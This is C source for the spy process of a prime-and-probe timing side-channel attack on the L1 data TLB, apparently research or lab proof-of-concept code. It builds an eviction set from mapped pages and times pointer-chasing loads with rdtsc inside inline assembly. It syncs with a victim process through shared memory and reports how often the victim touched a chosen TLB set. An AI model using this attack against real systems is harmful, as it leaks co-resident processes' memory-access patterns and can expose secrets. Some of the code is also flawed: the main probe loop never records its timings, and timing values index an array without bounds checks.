#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include "latency.h"

#define L1_SETS 64
#define L1_ASSOC 8
#define L1_DTLB_SETS 16
#define L1_DTLB_ASSOC 4
#define L2_STLB_SETS 128
#define L2_STLB_ASSOC 8
#define uint64_size 8
#define PAGES 4096
#define PAGE 4096
#define VTARGET 0x300000000000ULL

uint64_t array[50000];
int target;

/* mmap the file by fd to virtual page number p */
uint64_t *allocate_buffer(unsigned long long p, int fd, int page_no)
{
	assert(p >= 0);
	volatile char *target = (void *) (VTARGET+p*PAGE);
	volatile char *ret;
    uint64_t *access_ptr;
	printf("[DEBUG] allocating buffer at address %p\n", target);
	ret = mmap((void *) target, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED | MAP_FILE, fd, 0);
	if(ret == MAP_FAILED) {
		perror("mmap");
           exit(1);
	}
	if(ret != (volatile char *) target) { fprintf(stderr, "Wrong mapping\n"); exit(1); }
    access_ptr = (uint64_t *)ret;
    if(page_no == 0)
        memset((char *) ret, 0x00, PAGE); /* Initialise whole page with zero  */
	return (uint64_t *)ret;
}


void evict_l1(){
    int i, j;
    for(i=0; i<L1_SETS; i++){
        for(j=0; j<L1_ASSOC; j++)
            array[i + (j*uint64_size*L1_SETS)] = 0;
    }
    return;
}


/* Create eviction set for l1 dtlb */
uint64_t *create_evict_set1(int pages, int set_no, int fd){
    assert(pages == 5);
    int page_no, offset, curr_page;
    uint64_t *head, *request;
    uint64_t mask;
    curr_page = 0;
    while(pages != 0){
        page_no = rand() % 6567536;
        /*
         * check if page is targetting an particular set in l1
         */
        if((page_no % L1_DTLB_SETS) == set_no){
            //printf("[DEBUG1] allocating page no %d\n", page_no);
            if(curr_page == 0)
                head = allocate_buffer(page_no, fd, curr_page);
            else
                request = allocate_buffer(page_no, fd, curr_page);
            if(curr_page > 0)
                *(head + curr_page - 1) = (uint64_t)(request + curr_page );
            pages--;
            curr_page++;
        }

    }
    return head;
}

int main(){
    int cpu_num, count, set_no, curr_access_time,  threshold, max, fd;
    int *sync_var;
    int access_time[100000] = {0};
    int access_time1[100000] = {0};
    uint64_t *probe;
    volatile struct sharestruct *myshare;
    myshare = get_sharestruct();
    cpu_num = 5;
    set_no = 7;

    fd = open("set1.file", O_RDWR);
    if(fd == -1){
        printf("set1.file opening failed. create file named set1.file of size 4KB and run again.\n");
        exit(-1);
    }
    pin_cpu(cpu_num);


    probe = create_evict_set1(5, set_no, fd);

    printf("Allocated address: ");
    for (int i=0; i<5; i++){
        printf("%lx\t", probe[i]);
    }
    printf("\n");
    evict_l1();
    asm volatile("cpuid" ::: "rax", "rbx", "rcx");
    for(int i=0; i<1000; i++){
        asm volatile(
                "lfence\n"
                "rdtsc\n"
                "mov %%eax, %%edi\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%2), %2\n"
                "lfence\n"
                "rdtscp\n"
                "sub %%edi, %%eax\n"
                "mov %%eax, %0\n"
                : "=r" (curr_access_time)
                : "r" (probe), "r" (probe)
                : "rax", "rbx", "rcx", "rdx", "rdi");
        access_time1[curr_access_time]++;
    }
    
        printf("spy\t");
    evict_l1();
    int num, j;
    if(myshare->target_started == 2){
        // Starting prime and probe as victim is waiting for sync
        myshare->target_started = 1;
        asm volatile(
                "lfence\n"
                "rdtsc\n"
                "mov %%eax, %%edi\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "mov (%1), %1\n"
                "lfence\n"
                "rdtscp\n"
                "sub %%edi, %%eax\n"
                "mov %%eax, %0\n"
                "cpuid\n"
                : "=r" (curr_access_time)
                : "r" (probe)
                : "rax", "rbx", "rcx", "rdx", "rdi");
        count = 0;
        int count1 = 0;
        while(myshare->target_started == 1){
            asm volatile(
                    "lfence\n"
                    "rdtsc\n"
                    "mov %%eax, %%edi\n"
                    "mov (%1), %1\n"
                    "mov (%1), %1\n"
                    "mov (%1), %1\n"
                    "mov (%1), %1\n"
                    "mov (%2), %2\n"
                    "lfence\n"
                    "rdtscp\n"
                    "sub %%edi, %%eax\n"
                    "mov %%eax, %0\n"
                    : "=r" (curr_access_time)
                    : "r" (probe), "r" (probe)
                    : "rax", "rbx", "rcx", "rdx", "rdi");
            //access_time[curr_access_time]++;
        }
    }

    int sum = 0;
    for(int i=0; i<1000; i++){
        sum += access_time1[i];
        if(sum >= 980){
            threshold = i+1;
            break;
        }
    }
    printf("threshold = %d\n", threshold);
    //threshold = 150;
    for(int i=0; i<1000; i++){
        if(access_time[i]){
            //printf("[%d]: %d\n", i, access_time[i]);
            if(i >= threshold)
                count += access_time[i];
        }
    }
        printf("Victim accessed set no %d, %d no of time\n", set_no, count);
    return 0;
}
